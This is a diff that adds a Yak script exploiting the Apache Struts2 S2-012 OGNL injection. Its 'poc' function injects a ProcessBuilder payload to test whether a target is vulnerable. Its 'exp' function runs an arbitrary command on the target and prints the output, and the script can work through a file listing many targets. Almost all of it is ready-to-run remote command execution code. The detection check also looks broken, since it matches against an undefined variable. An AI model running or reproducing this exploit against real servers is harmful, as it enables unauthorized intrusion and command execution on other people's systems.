@@ -1,0 +1,75 @@
+
+def poc(url){
+
+    echo_data = codec.EscapeQueryUrl("\""+str.Join(str.Split("echo " + randstr(8)," "),"\",\"")+"\"")
+
+    payload =  "%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B"+ echo_data +"%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D"
+
+    req, err = http.Post(
+            url,
+            http.useragent(http.uarand()),
+            http.header("Content-Type","application/x-www-form-urlencoded"),
+            http.body(sprintf("name=%s",payload)),
+            )
+    if err != nil {
+        return
+    }
+
+    rsp_data = http.GetAllBody(req)
+    if re.Match(random_str,rsp_data){
+        log.warn(url + " S2_012 found !!!")
+    }else{
+        log.debug(url + " S2_012 safe !!!")
+    }
+}
+
+
+def  exp(url,cmd){
+    echo_data = codec.EscapeQueryUrl("\""+str.Join(str.Split(cmd," "),"\",\"")+"\"")
+
+    payload =  "%25%7B%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B"+ echo_data +"%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D"
+
+    req, err = http.Post(
+            url,
+            http.useragent(http.uarand()),
+            http.header("Content-Type","application/x-www-form-urlencoded"),
+            http.body(sprintf("name=%s",payload)),
+            )
+    if err != nil {
+        return
+    }
+
+    rsp_data = http.GetAllBody(req)
+    println(string(rsp_data))
+}
+
+
+if YAK_MAIN {
+    loglevel("info")
+    u = cli.String("u")
+    file = cli.LineDict("f")
+    cmd = cli.String("cmd")
+
+    if u == "" && len(file)<1 {
+        log.info("you need input target -u or -f")
+        return
+    }
+
+    if u != ""{
+        if cmd != ""{
+            exp(u,cmd)
+        }else{
+            poc(u)
+        }
+        return
+    }
+
+    for _,u = range file {
+         if cmd != "" {
+            exp(u,cmd)
+        }else{
+            poc(u)
+        }
+    }
+
+}
